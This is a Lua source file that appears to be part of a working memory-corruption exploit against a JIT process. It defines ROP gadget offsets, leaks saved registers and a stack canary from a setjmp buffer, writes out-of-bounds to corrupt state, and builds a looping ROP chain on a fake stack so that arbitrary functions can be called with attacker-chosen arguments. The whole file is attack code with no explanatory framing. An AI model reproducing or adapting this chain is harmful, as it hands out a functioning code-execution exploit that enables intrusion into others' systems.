
local chain_idx = 0

local function push_chain(value)
    local chain_addr = FAKE_RSP + 0x1A0 + chain_idx * 8
    write64(chain_addr, value)
    chain_idx = chain_idx + 1
    return chain_addr
end
    
    
function jit_init_rop()

    JIT_ROP = {
        -- 0x72: ret ;
        RET = JIT_BASE + 0x72,
        
        -- 0x501f: mov rax, rdi ; ret ;
        MOV_RAX_RDI_RET = JIT_BASE + 0x501f,
        -- 0xeea41: pop rdi ; ret ;
        POP_RDI_RET = JIT_BASE + 0xeea41,
        -- 0xeea8a: pop rsi ; ret ;
        POP_RSI_RET = JIT_BASE + 0xeea8a,
        -- 0xfced7: mov rdx, rdi ; ret ;
        MOV_RDX_RDI_RET = JIT_BASE + 0xfced7,
        -- 0xfe9fc: pop rcx ; ret ;
        POP_RCX_RET = JIT_BASE + 0xfe9fc,
        -- 0x7a69c: pop rbx ; ret ;
        POP_RBX_RET = JIT_BASE + 0x7a69c,
    
        -- 0x347d0: mov qword [rbx+0x08], rax ; pop rbx ; pop r14 ; pop rbp ; ret ;
        MOV_DEREF_RBX_RAX_RET = JIT_BASE + 0x347d0,
    
        -- 0x144210: pop rsp ; ret ;
        POP_RSP_RET = JIT_BASE + 0x144210,
        -- 0x194: pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret ;
        POP_R12_R13_R14_R15_RBP_RET = JIT_BASE + 0x194,
        
        -- 0x140da7: mov rax, qword [rax+0x00004150] ; ret
        MOV_RAX_DEREF_RAX_RET = JIT_BASE + 0x140da7,
        
        -- 0x84849: mov qword [rax], r8 ; add dh, dh ; ret ;
        MOV_DEREF_RAX_R8_RET = JIT_BASE + 0x84849,

        -- 0x2db63: mov r8, rbx ; movsxd rcx, qword [rax+r13*4] ; add rcx, rax ; jmp rcx ;
        MOV_R8_RBX_RET = JIT_BASE + 0x2db63,
        -- 0x18b23: mov r9, rbx ; movsxd rcx, qword [rax+r13*4] ; add rcx, rax ; jmp rcx ;
        MOV_R9_RBX_RET = JIT_BASE + 0x18b23,
        
    }
    
    -- Leak from setjmp buffer
    LEAK_RBX = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x08) -- DOOR3_SHM
    LEAK_RSP = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x10) 
    LEAK_RBP = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x18)
    LEAK_R12 = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x20) -- DOOR3_SHM + 8 ?
    LEAK_R13 = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x28)
    LEAK_R14 = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x30) -- DOOR3_SHM
    LEAK_R15 = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x38) -- stack canary
    
    FAKE_RSP = OOB_SCRATCH_BASE + 0x60000
    
    write64(OOB_SCRATCH_BASE + 0x180, OOB_SCRATCH_BASE + 0x3000)    
    -- overwrite setjmp buffer in realtime
    write32(OOB_SCRATCH_BASE + 0x108, 0xFFFFFFFF)
    write32(OOB_SCRATCH_BASE + 0x10C, 0)
    write64(OOB_SCRATCH_BASE + 0x1000, OOB_SCRATCH_BASE + 0x1100)
    write64(OOB_SCRATCH_BASE + 0x1100, OOB_SCRATCH_BASE + 0x1300)
    write64(OOB_SCRATCH_BASE + 0x1110, OOB_SCRATCH_BASE + 0x1200)
    write64(OOB_SCRATCH_BASE + 0x1200, 0)
    write64(OOB_SCRATCH_BASE + 0x1208, 0)
    write32(OOB_SCRATCH_BASE + 0x1118, 0xFFFF)
    write64(OOB_SCRATCH_BASE + 0x1300, FAKE_RSP)
    write64(OOB_SCRATCH_BASE + 0x100, (OOB_SCRATCH_BASE + 0x1000) - (DOOR3_SHM & 0xFFFFFFFF) * 8)
    
    write64(OOB_SCRATCH_BASE + 0x1318, 0)

    write32(OOB_SCRATCH_BASE + 0x48, 0x900)
    
    write32(DOOR3_SHM + 0x08, 0x1) -- sub_149110 thread unlock
    write32(DOOR3_SHM + 0x0C, 0x812) -- sub_154A60 case 2066 
    write32(DOOR3_SHM + 0x10, 0x10)
    write32(DOOR3_SHM + 0x14, 0)
    write64(DOOR3_SHM + 0x38, OOB_SCRATCH_BASE + 0x118)
    
    -- dummy fill
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    
    JIT_ROP_CHAIN_START = push_chain(JIT_ROP.RET)
    
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)    
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    
    -- Make ROP chain to infinite loop
    JIT_ROP_CHAIN_END = push_chain(JIT_ROP.POP_RSP_RET)
    push_chain(JIT_ROP_CHAIN_END)
    
    syscall.write(ORG_MAIN_SOCK, "3", 1)
    
    microsleep(100000)
    
end

function jit_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
    
    local string_idx= 0
    
    local function process_arg(arg)
        if arg == nil then
            return 0
        elseif type(arg) == "string" then
            if #arg > 0x2500 then
               error("string argument length cannot exceed 0x2500") 
            end
            local string_buf_addr = JIT_STRING_SCRATCH + string_idx * 0x2500
            write_string(string_buf_addr, arg)
            string_idx = string_idx + 1
            return string_buf_addr
        else
            return arg
        end
    end
    
    local rax = rax or 0
    
    local arg1 = process_arg(arg1)
    local arg2 = process_arg(arg2)
    local arg3 = process_arg(arg3)
    local arg4 = process_arg(arg4)
    local arg5 = process_arg(arg5)
    local arg6 = process_arg(arg6)
    
    chain_idx = 0

    -- dummy fill
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)
    push_chain(JIT_ROP.RET)

    -- r8 
    -- mov r8, rbx ; movsxd rcx, qword [rax+r13*4] ; add rcx, rax ; jmp rcx ;
    local TEMP_R13 = ((FAKE_RSP - 0x20000 - JIT_ROP.RET) // 4) + 1
    write64(TEMP_R13 * 4 + JIT_ROP.RET, 0)
    push_chain(JIT_ROP.POP_R12_R13_R14_R15_RBP_RET)
    push_chain(LEAK_R12)
    push_chain(TEMP_R13) -- r13
    push_chain(LEAK_R14)
    push_chain(LEAK_R15)
    push_chain(LEAK_RBP)
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(JIT_ROP.RET) -- rax
    push_chain(JIT_ROP.MOV_RAX_RDI_RET)
    push_chain(JIT_ROP.POP_RBX_RET)
    push_chain(arg5)
    push_chain(JIT_ROP.MOV_R8_RBX_RET)
    
    -- r9 
    -- mov r9, rbx ; movsxd rcx, qword [rax+r13*4] ; add rcx, rax ; jmp rcx ;
    push_chain(JIT_ROP.POP_R12_R13_R14_R15_RBP_RET)
    push_chain(LEAK_R12)
    push_chain(TEMP_R13) -- r13
    push_chain(LEAK_R14)
    push_chain(LEAK_R15)
    push_chain(LEAK_RBP)
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(JIT_ROP.RET) -- rax
    push_chain(JIT_ROP.MOV_RAX_RDI_RET)
    push_chain(JIT_ROP.POP_RBX_RET)
    push_chain(arg6)
    push_chain(JIT_ROP.MOV_R9_RBX_RET)
    
    -- rax
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(rax)
    push_chain(JIT_ROP.MOV_RAX_RDI_RET)
    
    -- rdx
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(arg3)
    push_chain(JIT_ROP.MOV_RDX_RDI_RET)

    -- rdi
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(arg1)
    
    -- rsi
    push_chain(JIT_ROP.POP_RSI_RET)
    push_chain(arg2)    

    -- rcx
    push_chain(JIT_ROP.POP_RCX_RET)
    push_chain(arg4)
    
    push_chain(address)

    -- Get return value
    push_chain(JIT_ROP.POP_RBX_RET)
    push_chain(OOB_SCRATCH_BASE + 0x2000 - 8)
    push_chain(JIT_ROP.MOV_DEREF_RBX_RAX_RET)
    push_chain(LEAK_RBX)
    push_chain(LEAK_R14)
    push_chain(LEAK_RBP)

    push_chain(JIT_ROP.POP_R12_R13_R14_R15_RBP_RET)
    push_chain(LEAK_R12)
    push_chain(LEAK_R13)
    push_chain(LEAK_R14)
    push_chain(LEAK_R15)
    push_chain(LEAK_RBP)

    -- Make ROP chain loop again at the end
    push_chain(JIT_ROP.POP_RDI_RET)
    push_chain(JIT_ROP_CHAIN_END)
    push_chain(JIT_ROP.MOV_RAX_RDI_RET)

    push_chain(JIT_ROP.POP_RBX_RET)
    push_chain(JIT_ROP_CHAIN_END)
    push_chain(JIT_ROP.MOV_DEREF_RBX_RAX_RET)
    push_chain(LEAK_RBX)
    push_chain(LEAK_R14)
    push_chain(LEAK_RBP)
    
    -- Trigger ROP chain by breaking ROP loop
    push_chain(JIT_ROP.POP_RSP_RET)
    push_chain(JIT_ROP_CHAIN_START)
    
    -- Wait until JIT ROP chain finishes
    while read64(JIT_ROP_CHAIN_END + 0x8) ~= JIT_ROP_CHAIN_END do 
        -- Add micro bump to make GC happy
        microsleep(1000)
    end
    
    return read64(OOB_SCRATCH_BASE + 0x2000)
    
end
    